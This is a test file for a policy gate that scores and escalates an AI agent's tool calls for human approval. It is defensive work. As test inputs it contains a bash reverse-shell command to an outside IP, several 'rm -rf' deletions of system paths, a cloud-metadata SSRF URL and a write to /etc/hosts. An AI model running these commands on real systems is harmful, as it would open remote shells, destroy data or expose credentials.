import { describe, it, expect, beforeEach, vi } from 'vitest';
import { PolicyGate } from '../security/policy-gate.js';
import type { BehaviorAnalyzerProvider } from '@paddock/types';

describe('PolicyGate', () => {
  let gate: PolicyGate;

  beforeEach(() => {
    gate = new PolicyGate('/workspace');
  });

  describe('evaluate', () => {
    it('should approve safe read operations', () => {
      const verdict = gate.evaluate({
        correlationId: 'c1',
        toolName: 'read',
        toolInput: { path: '/workspace/src/index.ts' },
      });
      expect(verdict.verdict).toBe('approve');
      expect(verdict.riskScore).toBeLessThanOrEqual(30);
    });

    it('should escalate reverse shell attempts to HITL instead of auto-rejecting them', () => {
      const verdict = gate.evaluate({
        correlationId: 'c2',
        toolName: 'exec',
        toolInput: { command: 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1' },
      });
      expect(verdict.verdict).toBe('ask');
      expect(verdict.riskScore).toBeGreaterThan(90);
    });

    it('should flag destructive rm for HITL', () => {
      const verdict = gate.evaluate({
        correlationId: 'c3',
        toolName: 'exec',
        toolInput: { command: 'rm -rf /etc' },
      });
      expect(verdict.verdict).toBe('ask');
      expect(verdict.riskScore).toBeGreaterThanOrEqual(70);
    });

    it('should approve normal exec commands', () => {
      const verdict = gate.evaluate({
        correlationId: 'c4',
        toolName: 'exec',
        toolInput: { command: 'ls -la /workspace' },
      });
      expect(verdict.verdict).toBe('approve');
    });

    it('should flag SSRF attempts', () => {
      const verdict = gate.evaluate({
        correlationId: 'c5',
        toolName: 'web_fetch',
        toolInput: { url: 'http://169.254.169.254/latest/meta-data/' },
      });
      expect(verdict.riskScore).toBeGreaterThanOrEqual(70);
    });

    it('should approve loopback browser navigation inside the sandbox VM', () => {
      const verdict = gate.evaluate({
        correlationId: 'c5-browser',
        toolName: 'browser',
        toolInput: { action: 'navigate', url: 'http://127.0.0.1:8765/report.html' },
      });
      expect(verdict.verdict).toBe('approve');
      expect(verdict.riskScore).toBeLessThanOrEqual(30);
    });

    it('should reject disabled gateway tool calls', () => {
      const verdict = gate.evaluate({
        correlationId: 'c6',
        toolName: 'gateway',
        toolInput: { action: 'restart' },
      });
      expect(verdict.verdict).toBe('reject');
      expect(verdict.riskScore).toBe(100);
      expect(verdict.triggeredRules).toContain('boundary:disabled_tool');
    });

    it('should keep high-risk sandbox-local tools available for approval workflows', () => {
      const verdict = gate.evaluate({
        correlationId: 'c7',
        toolName: 'write',
        toolInput: { path: '/etc/hosts', content: '127.0.0.1 localhost' },
      });

      expect(verdict.verdict).toBe('ask');
      expect(verdict.riskScore).toBeGreaterThan(70);
    });
  });

  describe('trust decay', () => {
    it('should decrease trust score on anomalies', () => {
      const initial = gate.getTrustProfile();
      expect(initial.score).toBe(100);

      // Trigger anomalies
      gate.evaluate({ correlationId: 'c1', toolName: 'exec', toolInput: { command: 'sudo rm -rf /' } });
      const after = gate.getTrustProfile();
      expect(after.score).toBeLessThan(100);
      expect(after.anomalyCount).toBeGreaterThan(0);
    });

    it('should increase penalty boost when trust is low', () => {
      // Trigger many anomalies to drop trust below 60
      for (let i = 0; i < 10; i++) {
        gate.evaluate({ correlationId: `c${i}`, toolName: 'exec', toolInput: { command: 'sudo rm -rf /' } });
      }
      const profile = gate.getTrustProfile();
      expect(profile.penaltyBoost).toBeGreaterThan(0);
    });
  });

  describe('reset', () => {
    it('should reset trust profile', () => {
      gate.evaluate({ correlationId: 'c1', toolName: 'exec', toolInput: { command: 'sudo rm -rf /' } });
      gate.reset();
      const profile = gate.getTrustProfile();
      expect(profile.score).toBe(100);
      expect(profile.anomalyCount).toBe(0);
      expect(profile.penaltyBoost).toBe(0);
    });

    it('should delegate to an injected behavior analyzer provider', () => {
      const analyzer: BehaviorAnalyzerProvider = {
        evaluate: vi.fn().mockReturnValue({
          riskBoost: 35,
          triggered: ['custom:review-required'],
        }),
        reset: vi.fn(),
      };

      const injectedGate = new PolicyGate({
        workspace: '/workspace',
        behaviorAnalyzer: analyzer,
      });

      const verdict = injectedGate.evaluate({
        correlationId: 'c-custom',
        toolName: 'write',
        toolInput: { path: '/workspace/notes.txt', content: 'hello' },
      });

      expect(analyzer.evaluate).toHaveBeenCalledOnce();
      expect(verdict.triggeredRules).toContain('custom:review-required');

      injectedGate.reset();
      expect(analyzer.reset).toHaveBeenCalledOnce();
    });
  });
});
